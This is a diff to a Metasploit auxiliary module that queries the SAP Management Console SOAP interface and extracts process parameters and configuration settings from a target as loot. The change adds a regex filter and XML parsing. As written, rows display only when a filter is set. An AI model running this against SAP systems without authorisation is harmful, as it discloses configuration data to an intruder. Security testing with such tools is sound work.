@@ -21,7 +21,10 @@ class Metasploit4 < Msf::Auxiliary
 		super(
 			'Name'         => 'SAP Management Console Get Process Parameters',
 			'Version'      => '$Revision$',
-			'Description'  => %q{ This module simply attempts to output a SAP process parameters and configuration settings through the SAP Management Console SOAP Interface. },
+			'Description'  => %q{
+				This module simply attempts to output a SAP process parameters and
+				configuration settings through the SAP Management Console SOAP Interface.
+				},
 			'References'   =>
 				[
 					# General
@@ -35,8 +38,7 @@ class Metasploit4 < Msf::Auxiliary
 			[
 				Opt::RPORT(50013),
 				OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
-				OptString.new('UserAgent', [ true, "The HTTP User-Agent sent in the request",
-				'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' ]),
+				OptString.new('MATCH', [false, 'Display matches e.g login/', '']),
 			], self.class)
 		register_autofilter_ports([ 50013 ])
 		deregister_options('RHOST')
@@ -75,7 +77,8 @@ class Metasploit4 < Msf::Auxiliary
 		ns1 = 'ns1:GetProcessParameter'
 
 		data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
-		data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv + '"  xmlns:xsi="' + xsi + '" xmlns:xs="' + xs + '">' + "\r\n"
+		data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv + '"  xmlns:xsi="' + xsi
+		data << '" xmlns:xs="' + xs + '">' + "\r\n"
 		data << '<SOAP-ENV:Header>' + "\r\n"
 		data << '<sapsess:Session xlmns:sapsess="' + sapsess + '">' + "\r\n"
 		data << '<enableSession>true</enableSession>' + "\r\n"
@@ -99,12 +102,18 @@ class Metasploit4 < Msf::Auxiliary
 					}
 			}, 30)
 
-			env = []
+			if not res
+				print_error("#{rhost}:#{rport} [SAP] Unable to connect")
+				return
+			end
+
 			if res.code == 200
 				case res.body
 				when nil
 					# Nothing
 				when /<parameter>(.*)<\/parameter>/i
+					body = []
+					body = res.body
 					success = true
 				end
 			elsif res.code == 500
@@ -113,6 +122,8 @@ class Metasploit4 < Msf::Auxiliary
 					faultcode = $1.strip
 					fault = true
 				end
+			else
+				print_error("#{rhost}:#{rport} [SAP] Unable to communicate with remote host.")
 			end
 
 		rescue ::Rex::ConnectionError
@@ -122,27 +133,47 @@ class Metasploit4 < Msf::Auxiliary
 
 		if success
 			print_good("#{rhost}:#{rport} [SAP] Process Parameters: Entries extracted to loot")
-			addr = Rex::Socket.getaddress(rhost) # Convert rhost to ip for DB
-			store_loot("sap.getprocessparameters", "text/xml", addr, res.body, ".xml")
+			store_loot(
+				"sap.getprocessparameters",
+				"text/xml",
+				rhost,
+				res.body,
+				".xml"
+			)
 
 			saptbl = Msf::Ui::Console::Table.new(
 				Msf::Ui::Console::Table::Style::Default,
-			'Header'    => "[SAP] Process Parameters #{rhost}:#{rport}",
+			'Header'    => "[SAP] Process Parameters",
 			'Prefix'  => "\n",
-			'Postfix' => "\n",
 			'Indent'    => 1,
 			'Columns'   =>
 			[
-				"name",
-				"description",
-				"value"
+				"Name",
+				"Description",
+				"Value"
 			])
 
-			env.each do |output|
-				saptbl << [ output[0], output[1], output[2] ]
+			if not datastore['MATCH'].empty?
+				name_match = Regexp.new(datastore['MATCH'], [Regexp::EXTENDED, 'n'])
+				print_status("Attempting to display configuration matches for #{name_match}")
+			end
+			xmldata = REXML::Document.new(body)
+			xmlpath = '/SOAP-ENV:Envelope/SOAP-ENV:Body/'
+			xmlpath << '/SAPControl:GetProcessParameterResponse'
+			xmlpath << '/parameter/item'
+			xmldata.elements.each(xmlpath) do | ele |
+				if not datastore['MATCH'].empty? and ele.elements["name"].text.match(/#{name_match}/)
+					name = ele.elements["name"].text if not ele.elements["name"].nil?
+					desc = ele.elements["description"].text if not ele.elements["description"].nil?
+					desc = '' if desc.nil?
+					val = ele.elements["value"].text if not ele.elements["value"].nil?
+					val = '' if val.nil?
+					saptbl << [ name, desc, val ]
+				end
 			end
 
-			print_status(saptbl.to_s)
+			print_status(saptbl.to_s) if not saptbl.to_s.empty?
+
 			return
 
 		elsif fault
@@ -150,6 +181,7 @@ class Metasploit4 < Msf::Auxiliary
 			return
 
 		else
+			# Something has gone horribly wrong
 			print_error("#{rhost}:#{rport} [SAP] failed to request environment")
 			return
 		end
